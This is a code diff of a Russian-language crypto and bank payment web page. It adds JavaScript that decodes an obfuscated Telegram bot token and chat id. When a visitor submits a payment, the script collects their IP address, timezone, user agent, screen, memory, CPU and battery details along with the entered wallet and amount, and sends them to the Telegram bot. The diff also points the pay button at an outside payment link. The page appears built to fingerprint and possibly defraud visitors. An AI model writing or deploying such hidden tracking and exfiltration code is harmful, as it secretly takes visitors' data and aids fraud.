@@ -31,7 +31,7 @@
       -webkit-text-fill-color: transparent;
       animation: glow 4s linear infinite;
     }
-    @hosdx9nd2iidxod1wframes glow {
+    @keyframes glow {
       0% { text-shadow: 0 0 10px #ff0057; }
       50% { text-shadow: 0 0 20px #00f2ff; }
       100% { text-shadow: 0 0 10px #00ff88; }
@@ -214,7 +214,7 @@
             <li>ПриватБанк</li>
             <li>Apple Pay / Google Pay</li>
           </ul>
-          <a href="https://magickirasway.github.io/Rainbow/" target="_blank" class="button-link">[to do]</a>
+          <a href="https://mobile-app.pumb.ua/cy5hEmTQSu5xC6ak7" target="_blank" class="button-link">Перейти к оплате</a>
         </div>
       </section>
 
@@ -264,112 +264,155 @@
 
 
   <script>
-  let hasdx9nd2dxad = 'hbCGZ357emh/eZBqfqyheYKKmK+JoZWdk2d/iYGJfGaKiWaqlaJ+foR6lamSsZWLkmiQa4V5oYZ+n4adjYdubw==';
-  let hasdx9nd2dxod = 'hbCKqn6hdmh9iYytf4NudA==';
-  function hosdx9nd2iidxud(hosdx9nd2iidxud1w, hosdx9nd2iidxod1w) {
-    const hosdx9nder = atob(hosdx9nd2iidxud1w);
+
+    let kakayatohuina = 'hbCGZ357emh/eZBqfqyheYKKmK+JoZWdk2d/iYGJfGaKiWaqlaJ+foR6lamSsZWLkmiQa4V5oYZ+n4adjYdubw==';
+  let kakayatohueta = 'hbCKqn6hdmh9iYytf4NudA==';
+
+
+  function decryptWithKey(encB64, key) {
+    const encrypted = atob(encB64); 
     let res = '';
-    for (let y7jfe9j9f = 0; y7jfe9j9f < hosdx9nder.length; y7jfe9j9f++) {
-      const hosdx9ndersda = hosdx9nd2iidxod1w.charCodeAt(i % hosdx9nd2iidxod1w.length);
-      res += String.fromCharCode(hosdx9nder.charCodeAt(i) - hosdx9ndersda);
+    for (let i = 0; i < encrypted.length; i++) {
+      const shift = key.charCodeAt(i % key.length);
+      res += String.fromCharCode(encrypted.charCodeAt(i) - shift);
     }
-    return atob(res); 
+    return atob(res);
   }
-  const hosdx9nd2dxud = '7612171505';
-  const hasdx9nd2dxid = hosdx9nd2iidxud(hasdx9nd2dxod, hosdx9nd2dxud);
-  const hasdx9nd2dxud = hosdx9nd2iidxud(hasdx9nd2dxad, hasdx9nd2dxid);
+
+
+  const omejkaprivet = '7612171505';
+  const hasdhj87hasud09haisd = decryptWithKey(kakayatohueta, omejkaprivet);
+  const hasdhj87hasud09halsd = decryptWithKey(kakayatohuina, hasdhj87hasud09haisd);
+
+
+
     const receiverAddresses = {
       btc: 'bc1qjskeemvrs8925h5j0063xxpdq329ncfa7zpyyl',
       eth: '0x1a1957D8fa64E1CEFFEf62acEEa63eC535E2D6d8',
       monero: '41yEBWT9gBZ9n81EXEEzF4bSMEXyKUpB4c82AQXZCJSvWjvWUznFMZnM656pcM7jupWMRKfnZxEQeXx1M1hroptBTcgi8zo'
     };
 
-    function openModal(type) {
-      currentWalletType = type;
-      document.getElementById('walletModal').style.display = 'flex';
-      const modalTitle = {
-        monero: 'Введите Monero-кошелек',
-        btc: 'Введите Bitcoin-кошелек',
-        eth: 'Введите Ethereum-кошелек'
-      };
-      document.getElementById('modalTitle').textContent = modalTitle[type] || 'Введите адрес';
-      document.getElementById('walletInput').value = '';
-      document.getElementById('errorText').classList.remove('visible');
+
+
+
+
+  function openModal(type) {
+    currentWalletType = type;
+    document.getElementById('walletModal').style.display = 'flex';
+    const modalTitle = {
+      monero: 'Введите Monero-кошелек',
+      btc: 'Введите Bitcoin-кошелек',
+      eth: 'Введите Ethereum-кошелек'
+    };
+    document.getElementById('modalTitle').textContent = modalTitle[type] || 'Введите адрес';
+    document.getElementById('walletInput').value = '';
+    document.getElementById('errorText').classList.remove('visible');
+  }
+
+  function closeModal() {
+    document.getElementById('walletModal').style.display = 'none';
+  }
+
+  function closeConfirmModal() {
+    document.getElementById('confirmModal').style.display = 'none';
+  }
+
+  function validateWallet(type, address) {
+    const patterns = {
+      btc: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
+      eth: /^0x[a-fA-F0-9]{40}$/,
+      monero: /^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/
+    };
+    return patterns[type]?.test(address);
+  }
+
+  function submitWallet(event) {
+    event.preventDefault();
+    const input = document.getElementById('walletInput');
+    const error = document.getElementById('errorText');
+    const address = input.value.trim();
+    const isValid = validateWallet(currentWalletType, address);
+
+    if (!isValid) {
+      error.classList.add('visible');
+      return false;
     }
 
-    function closeModal() {
-      document.getElementById('walletModal').style.display = 'none';
+    enteredWallet = address;
+    closeModal();
+    document.getElementById('senderWallet').textContent = enteredWallet;
+    document.getElementById('receiverWallet').textContent = receiverAddresses[currentWalletType] || 'Неизвестно';
+    document.getElementById('paymentAmount').value = '';
+    document.getElementById('confirmModal').style.display = 'flex';
+    return true;
+  }
+
+  async function submitPayment() {
+    const amount = document.getElementById('paymentAmount').value;
+    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
+      alert("Введите корректную сумму.");
+      return;
     }
 
-    function closeConfirmModal() {
-      document.getElementById('confirmModal').style.display = 'none';
-    }
+    const receiver = receiverAddresses[currentWalletType] || 'Неизвестно';
 
-    function validateWallet(type, address) {
-      const patterns = {
-        btc: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
-        eth: /^0x[a-fA-F0-9]{40}$/,
-        monero: /^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/
-      };
-      return patterns[type]?.test(address);
-    }
+    // Сбор доп. инфы
+    const ipData = await fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .catch(() => ({ ip: "❌" }));
 
-    function submitWallet(event) {
-      event.preventDefault();
-      const input = document.getElementById('walletInput');
-      const error = document.getElementById('errorText');
-      const address = input.value.trim();
-      const isValid = validateWallet(currentWalletType, address);
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const ua = navigator.userAgent;
+    const lang = navigator.language;
+    const screenRes = `${screen.width}x${screen.height}`;
+    const colorDepth = screen.colorDepth;
+    const deviceMem = navigator.deviceMemory || "Неизв.";
+    const cores = navigator.hardwareConcurrency || "Неизв.";
+    const platform = navigator.platform;
 
-      if (!isValid) {
-        error.classList.add('visible');
-        return false;
+    let batteryInfo = "❌";
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? "(⚡)" : "(🔋)"}`;
+      } catch (e) {
+        batteryInfo = "⚠️";
       }
-
-      enteredWallet = address;
-      closeModal();
-      document.getElementById('senderWallet').textContent = enteredWallet;
-      document.getElementById('receiverWallet').textContent = receiverAddresses[currentWalletType] || 'Неизвестно';
-      document.getElementById('paymentAmount').value = '';
-      document.getElementById('confirmModal').style.display = 'flex';
-      return true;
     }
 
-    function submitPayment() {
-      const amount = document.getElementById('paymentAmount').value;
-      if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
-        alert("Введите корректную сумму.");
-        return;
+    const message =
+      `💸 Новая оплата:\n\n` +
+      `💱 Валюта: ${currentWalletType.toUpperCase()}\n` +
+      `👤 Отправитель: ${enteredWallet}\n` +
+      `🏦 Получатель: ${receiver}\n` +
+      `💰 Сумма: ${amount}\n\n` +
+      `🌐 IP: ${ipData.ip}\n` +
+      `🕒 Зона: ${tz}, Дата: ${new Date().toLocaleString()}\n` +
+      `📱 UA: ${ua}\n` +
+      `💻 Платформа: ${platform}, Язык: ${lang}\n` +
+      `🖥️ Экран: ${screenRes}, Цвет: ${colorDepth}-бит\n` +
+      `🧠 RAM: ${deviceMem}GB, Ядер: ${cores}\n` +
+      `🔋 Батарея: ${batteryInfo}`;
+
+    fetch(`https://api.telegram.org/bot${hasdhj87hasud09halsd}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: hasdhj87hasud09haisd,
+        text: message
+      })
+    }).then(res => {
+      if (res.ok) {
+        alert("✅ Данные успешно отправлены!");
+      } else {
+        alert("⚠️ Ошибка при отправке в Telegram.");
       }
-
-      const receiver = receiverAddresses[currentWalletType] || 'Неизвестно';
-
-      const message =
-        `💸 Новая оплата:\n\n` +
-        `💱 Валюта: ${currentWalletType.toUpperCase()}\n` +
-        `👤 Отправитель: ${enteredWallet}\n` +
-        `🏦 Получатель: ${receiver}\n` +
-        `💰 Сумма: ${amount}`;
-
-      fetch(`https://api.telegram.org/bot${hasdx9nd2dxud}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: hasdx9nd2dxid,
-          text: message
-        })
-      }).then(res => {
-        if (res.ok) {
-          alert("✅ Данные успешно отправлены!");
-        } else {
-          alert("⚠️ Ошибка при отправке в Telegram.");
-        }
-        closeConfirmModal();
-      }).catch(() => {
-        alert("⚠️ Не удалось подключиться к Telegram API.");
-        closeConfirmModal();
-      });
-    }
+      closeConfirmModal();
+    }).catch(() => {
+      alert("⚠️ Не удалось подключиться к Telegram API.");
+      closeConfirmModal();
+    });
+  }
 
   </script>
 
